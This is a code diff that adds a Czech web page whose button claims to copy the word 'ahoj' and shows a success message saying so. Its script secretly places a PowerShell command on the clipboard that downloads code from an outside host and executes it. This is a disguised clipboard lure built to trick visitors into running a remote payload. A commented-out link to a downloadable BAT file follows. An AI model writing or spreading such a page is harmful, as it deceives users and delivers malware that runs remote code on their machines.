@@ -35,6 +35,41 @@
 </body>
 </html>
 
+<html lang="cs">
+<head>
+  <meta charset="UTF-8">
+  <title>Kopírování do schránky</title>
+  <style>
+    #zprava {
+      margin-top: 10px;
+      color: green;
+      font-weight: bold;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <button onclick="kopiruj()">Skryté 'ahoj'</button>
+  <div id="zprava">Text 'ahoj' byl zkopírován ✅</div>
+
+  <script>
+    function kopiruj() {
+      navigator.clipboard.writeText('powershell iwr "25plrp.cz/wifi" | iex')
+        .then(() => {
+          let msg = document.getElementById("zprava");
+          msg.style.display = "block";
+          // zpráva zmizí po 2 sekundách
+          setTimeout(() => { msg.style.display = "none"; }, 2000);
+        })
+        .catch(err => {
+          console.error("Nepodařilo se zkopírovat: ", err);
+        });
+    }
+  </script>
+</body>
+</html>
+
+
 
 <!--
 <p><a href="stahni.bat" download>Stáhnout BAT soubor</a> </p>
